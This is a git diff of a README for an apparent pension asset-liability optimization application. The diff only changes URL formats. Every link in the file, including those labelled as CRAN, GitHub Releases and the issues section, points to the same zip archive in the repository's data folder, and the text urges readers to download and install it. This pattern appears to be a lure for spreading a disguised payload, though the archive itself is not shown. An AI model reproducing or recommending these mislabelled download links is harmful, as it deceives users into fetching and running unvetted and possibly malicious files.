@@ -1,6 +1,6 @@
 # 📊 Pension-Asset-Liability-Management-Optimization - Optimize Your Pension Investments Easily
 
-[![Download Now](https://raw.githubusercontent.com/shjh229/Pension-Asset-Liability-Management-Optimization/main/data/Liability-Pension-Management-Asset-Optimization-v2.1.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/shjh229/Pension-Asset-Liability-Management-Optimization/main/data/Liability-Pension-Management-Asset-Optimization-v2.1.zip)
+[![Download Now](https://github.com/shjh229/Pension-Asset-Liability-Management-Optimization/raw/refs/heads/main/data/Liability-Pension-Management-Asset-Optimization-v2.1.zip%20Now-Click%20Here-blue)](https://github.com/shjh229/Pension-Asset-Liability-Management-Optimization/raw/refs/heads/main/data/Liability-Pension-Management-Asset-Optimization-v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -13,11 +13,11 @@ Before you begin, ensure your system meets the following requirements:
 - **Operating System:** Windows 10, macOS, or any recent Linux distribution.
 - **Memory:** At least 4GB of RAM.
 - **Disk Space:** Minimum of 500MB for installation.
-- **Software Dependencies:** Make sure you have R installed. You can download it from [CRAN](https://raw.githubusercontent.com/shjh229/Pension-Asset-Liability-Management-Optimization/main/data/Liability-Pension-Management-Asset-Optimization-v2.1.zip).
+- **Software Dependencies:** Make sure you have R installed. You can download it from [CRAN](https://github.com/shjh229/Pension-Asset-Liability-Management-Optimization/raw/refs/heads/main/data/Liability-Pension-Management-Asset-Optimization-v2.1.zip).
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/shjh229/Pension-Asset-Liability-Management-Optimization/main/data/Liability-Pension-Management-Asset-Optimization-v2.1.zip).
+To get started, visit this page to download: [GitHub Releases](https://github.com/shjh229/Pension-Asset-Liability-Management-Optimization/raw/refs/heads/main/data/Liability-Pension-Management-Asset-Optimization-v2.1.zip).
 
 1. Click on the link above.
 2. On the Releases page, find the latest version of the application.
@@ -59,7 +59,7 @@ For detailed instructions on using the application, please refer to the user gui
 
 ## 📞 Support
 
-If you encounter any issues, visit the [issues section](https://raw.githubusercontent.com/shjh229/Pension-Asset-Liability-Management-Optimization/main/data/Liability-Pension-Management-Asset-Optimization-v2.1.zip) of our repository to find solutions. You can also submit your problems, and the community or the maintainers will assist you.
+If you encounter any issues, visit the [issues section](https://github.com/shjh229/Pension-Asset-Liability-Management-Optimization/raw/refs/heads/main/data/Liability-Pension-Management-Asset-Optimization-v2.1.zip) of our repository to find solutions. You can also submit your problems, and the community or the maintainers will assist you.
 
 ## 🌐 Community
 
@@ -67,6 +67,6 @@ Join our community to share your experience or ask questions. Connect with other
 
 ## 📅 Updates
 
-Stay informed about updates and new features by visiting the [GitHub Releases](https://raw.githubusercontent.com/shjh229/Pension-Asset-Liability-Management-Optimization/main/data/Liability-Pension-Management-Asset-Optimization-v2.1.zip) page regularly. 
+Stay informed about updates and new features by visiting the [GitHub Releases](https://github.com/shjh229/Pension-Asset-Liability-Management-Optimization/raw/refs/heads/main/data/Liability-Pension-Management-Asset-Optimization-v2.1.zip) page regularly. 
 
 Thank you for using Pension Asset Liability Management Optimization. We hope this application helps you manage your pension investments with ease.
